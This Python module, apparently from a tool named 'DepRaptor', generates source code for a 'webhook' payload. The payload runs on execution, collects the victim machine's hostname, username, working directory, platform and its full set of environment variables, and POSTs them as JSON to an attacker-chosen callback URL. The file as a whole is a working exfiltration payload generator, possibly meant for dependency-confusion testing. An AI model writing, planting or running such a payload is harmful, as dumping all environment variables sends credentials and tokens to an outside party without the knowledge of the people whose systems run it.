"""
Payload: webhook
POSTs system info as JSON to a generic HTTP callback URL.
"""


def generate_payload(callback_url: str) -> str:
    """Return Python source code for the webhook payload."""
    return f'''import os, platform, socket, json
from datetime import datetime
from pathlib import Path

CALLBACK_URL = "{callback_url}"

def execute_payload():
    data = {{
        "tool": "DepRaptor",
        "timestamp": datetime.now().isoformat(),
        "hostname": socket.gethostname(),
        "username": os.getenv("USER") or os.getenv("USERNAME", "unknown"),
        "cwd": str(Path.cwd()),
        "platform": platform.platform(),
        "env": dict(os.environ),
    }}
    try:
        import urllib.request
        req = urllib.request.Request(
            CALLBACK_URL,
            data=json.dumps(data).encode(),
            headers={{"Content-Type": "application/json"}},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=10)
        print(f"[DepRaptor] Callback sent to {{CALLBACK_URL}}")
    except Exception as exc:
        print(f"[DepRaptor] Callback failed: {{exc}}")

execute_payload()
'''
